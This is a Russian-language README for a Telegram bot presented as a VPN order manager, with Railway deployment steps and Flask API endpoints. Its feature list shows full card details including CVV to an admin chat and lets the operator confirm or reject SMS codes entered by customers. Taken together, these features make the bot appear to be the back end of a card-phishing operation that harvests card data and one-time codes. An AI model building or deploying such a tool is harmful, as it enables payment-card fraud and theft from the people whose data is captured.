# VPN Order Management Telegram Bot

Исправленный Telegram бот для управления заказами системы VPN с автоматическими уведомлениями.

## ✅ Исправления

- **SMS сообщения**: Кнопка "Отправить SMS" теперь показывает "✅ SMS ОТПРАВЛЕН!" 
- **Полные данные карты**: Отображаются все поля включая CVV
- **Улучшенные кнопки**: Добавлена поддержка отклонения кода
- **Стабильная работа**: Оптимизирован для Railway деплоя

## 🚀 Деплой на Railway

### Переменные окружения

```
BOT_TOKEN=your_telegram_bot_token
WEB_SERVER_URL=https://your-web-server.railway.app
ADMIN_CHAT_ID=your_telegram_chat_id
```

### Автоматический деплой

1. Форкните этот репозиторий
2. Создайте новый Railway проект
3. Подключите GitHub репозиторий
4. Установите переменные окружения
5. Railway автоматически задеплоит бота

## 📋 Функции

- ✅ Автоматические уведомления о новых заказах
- 💳 Отображение полных данных карты (включая CVV)
- 📱 SMS верификация с правильными сообщениями
- ✅/❌ Подтверждение/отклонение кодов
- 📊 Управление статусами заказов
- 🔄 24/7 работа в облаке

## 🛠 API Integration

Интегрируется с Flask веб-сервером через REST API:

- `GET /api/bot/orders` - Получение заказов
- `POST /api/bot/approve/{order_id}` - Подтверждение заказа  
- `POST /api/bot/confirm_code/{order_id}` - Подтверждение кода
- `POST /api/bot/reject_code/{order_id}` - Отклонение кода

## 🔧 Команды бота

- `/start` - Приветствие и информация
- `/orders` - Показать активные заказы  
- `/help` - Справка по командам

Бот автоматически получает уведомления о новых заказах и изменениях статуса.
